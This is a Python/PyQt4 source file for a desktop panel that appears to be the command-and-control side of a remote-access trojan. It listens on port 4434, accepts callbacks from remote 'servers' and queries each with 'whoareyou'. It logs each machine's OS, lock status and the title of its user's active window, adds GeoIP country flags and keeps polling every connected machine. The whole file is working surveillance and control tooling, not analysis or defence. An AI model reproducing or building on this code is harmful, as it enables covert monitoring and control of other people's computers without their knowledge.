# -*- coding: utf-8 -*-

import sys
import socket
import pygeoip
import os
import time
import ast
import threading
from threading import Thread

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from ui import main_ui


class MainDialog(QMainWindow, main_ui.Ui_MainWindow):

    def __init__(self, parent=None):
        super(MainDialog, self).__init__(parent)
        self.setupUi(self)

        # sockets Timeout
        self.timeout = None

        # update gui
        self.gui = QApplication.processEvents

        # unlocked servers bank
        self.unlockedSockets = []

        # initial geo ip database
        self.geoip = pygeoip.GeoIP('assets\\GeoIP.dat')
        # initial assets directories
        self.assets = 'assets\\'
        self.flags = 'assets\\flags\\'

        # indexes for servers table
        self.index_of_ipAddress = 0
        self.index_of_socket = 1
        self.index_of_lock = 2
        self.index_of_os = 3
        self.index_of_activeWindowTitle = 4
        # initialize servers table columns width
        self.serversTable.setColumnWidth(self.index_of_ipAddress, 150)
        self.serversTable.setColumnWidth(self.index_of_socket, 60)
        self.serversTable.setColumnWidth(self.index_of_lock, 80)
        self.serversTable.setColumnWidth(self.index_of_os, 200)

        # Triggers
        self.startListenButton.clicked.connect(self.startListen)


    # Start Listen for Servers
    def startListen(self):
        # Initializing variables
        self.socks = {}
        self.acceptthreadState = True
        self.listenthread = Thread(target=self.listenConnections, args=(4434,))
        self.listenthread.setDaemon(True)
        self.listenthread.start()
        self.statusLabel.setText('Listening')
        self.statusLabel.setStyleSheet('color: lime; padding: 5px;')


    # listen for clients
    # accept connections
    # add to socketlist widget
    def listenConnections(self, port):

        # Initializing socket
        self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # telling the OS that you know what you're doing and you still want to bind to the same port
        self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind address
        self.c.bind(('0.0.0.0', int(port)))

        # Start listen for connections
        self.c.listen(128)
        while self.acceptthreadState:
            try:

                # Try accept connection
                self.sock, self.address = self.c.accept()
            except:

                continue

            if not self.acceptthreadState:
                return
            if self.sock:

                # TEST GET INFO
                try:
                    self.Send(self.sock, 'whoareyou')
                    data = self.Receive(self.sock)
                    info = ast.literal_eval(data)


                    # Set timeout None
                    self.sock.settimeout(self.timeout)

                    # Save connected socket
                    socketIndex = self.address[1]
                    self.socks[socketIndex] = {}
                    self.socks[socketIndex]['sock'] = self.sock
                    self.socks[socketIndex]['ip_address'] = self.address[0]
                    self.socks[socketIndex]['socket'] = self.address[1]
                    self.socks[socketIndex]['ostype'] = info['ostype']
                    self.socks[socketIndex]['protection'] = info['protection']
                    self.socks[socketIndex]['os'] = info['os']
                    self.socks[socketIndex]['activewindowtitle'] = info['activewindowtitle']

                    self.updateServersTable()

                    # Start Servers Check Thread
                    serversCheckThread = threading.Thread(target=self.checkServers)
                    serversCheckThread.setDaemon(True)
                    serversCheckThread.start()
                except:
                    continue

    # Servers Live Update
    def checkServers(self):
        while self.acceptthreadState:
            for i, k in self.socks.iteritems():
                sock = self.socks[i]['sock']
                sock.settimeout(3)
                try:
                    self.Send(sock, 'whoareyou')
                    data = self.Receive(sock)
                    info = ast.literal_eval(data)
                    self.socks[i]['protection'] = info['protection']
                    self.socks[i]['activewindowtitle'] = info['activewindowtitle']
                except socket.error:
                    del self.socks[i]
                    break
            self.updateServersTable()
            time.sleep(5)

    # Update Servers Table from self.socks
    def updateServersTable(self):
        self.serversTable.setRowCount(len(self.socks))
        for index, obj in enumerate(self.socks):

            # add ip address & county flag
            ip_address = self.socks[obj]['ip_address']
            item = QTableWidgetItem(ip_address)
            item.setIcon(QIcon(self.getIpLocation(ip_address)))
            self.serversTable.setItem(index, self.index_of_ipAddress, item)

            # add socket number
            item = QTableWidgetItem(str(self.socks[obj]['socket']))
            item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
            self.serversTable.setItem(index, self.index_of_socket, item)

            # add server lock status
            lock_status = 'LOCKED' if self.socks[obj]['protection'] == 'False' else 'UNLOCKED'
            item = QTableWidgetItem(lock_status)
            if lock_status == 'LOCKED':
                item.setTextColor(QColor('red'))
            else:
                item.setTextColor(QColor('lime'))
            item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
            self.serversTable.setItem(index, self.index_of_lock, item)

            # add os version
            item = QTableWidgetItem(self.socks[obj]['os'])
            item.setIcon(QIcon(os.path.join(self.assets, self.osIcon(self.socks[obj]['ostype']))))
            self.serversTable.setItem(index, self.index_of_os, item)

            # add active windows title
            item = QTableWidgetItem(self.socks[obj]['activewindowtitle'])
            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
            self.serversTable.setItem(index, self.index_of_activeWindowTitle, item)

        # adjust table
        #header = self.serversTable.horizontalHeader()
        #header.setStretchLastSection(True)
        # update servers online counter
        self.onlineStatus.setText(str(len(self.socks)))

    def osIcon(self, os):
        if os == "linux" or os == "linux2":
            return 'linux.png'
        elif os == "darwin":
            return 'mac.png'
        elif os == "win32":
            return 'windows.png'

    def getIpLocation(self, ip):
        try:
            country_flag = os.path.join(self.flags, self.geoip.country_code_by_addr(ip).lower() + '.png')
            if os.path.exists(country_flag):
                return country_flag
            else:
                return os.path.join(self.flags, 'blank.png')
        except:
            return os.path.join(self.flags, 'blank.png')

    # Stop Listen for Servers
    def stopListen(self):
        pass


    # send socket
    def Send(self, Sock, cmd, end="[ENDOFMESSAGE]"):
        try:
            Sock.sendall((cmd + end).encode('utf-8'))
        except socket.error:
            pass

    # recieve socket
    def Receive(self, Sock, end="[ENDOFMESSAGE]"):
        data = ""
        try:
            l = Sock.recv(1024)
            while l:
                time.sleep(0.1)
                data += l
                if data.endswith(end):
                    break
                else:
                    self.gui()
                    l = Sock.recv(1024)
        except socket.timeout:
            pass
        return data[:-len(end)].decode('utf-8')

# Run Application
def main():
    app = QApplication(sys.argv)
    # Initializing splashscreen
    #splash_pix = QPixmap('assets/splash.png')
    #splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
    #splash.setMask(splash_pix.mask())
    #splash.show()
    #time.sleep(3)
    # app.processEvents()
    form = MainDialog()
    form.show()
    #splash.finish(form)
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()